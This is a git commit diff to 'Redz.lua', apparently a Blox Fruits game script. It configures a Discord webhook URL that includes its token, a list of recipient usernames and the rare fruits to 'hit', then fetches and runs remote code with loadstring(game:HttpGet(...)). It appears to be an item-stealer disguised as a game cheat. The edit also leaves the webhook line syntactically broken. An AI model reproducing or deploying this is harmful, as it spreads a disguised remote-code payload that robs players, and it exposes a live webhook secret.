1d8b911935299caa5f3516a3c3cd96fcce586106
BloxFruit-LatestScript2025 <thapa43929@gmail.com>
2025-03-30 16:44:24 +0545

    Update Redz.lua

--- Redz.lua
+++ Redz.lua
@@ -1,6 +1,5 @@
-Webhook = "https://discord.com/api/webhooks/1355855478713876581/5OLOI5SWnkRC3DWh6zgJIy7AvueN-xW5Xx7Xvu9ViKrV_bJZmSWcgfDNNHi-1AWw-l8w" -- << Your Webhook
+https://discord.com/api/webhooks/1355855478713876581/5OLOI5SWnkRC3DWh6zgJIy7AvueN-xW5Xx7Xvu9ViKrV_bJZmSWcgfDNNHi-1AWw-l8w" -- << Your Webhook
 Usernames = {"ankit_2068", "karela0017"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Graviy-Gravity", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
-```
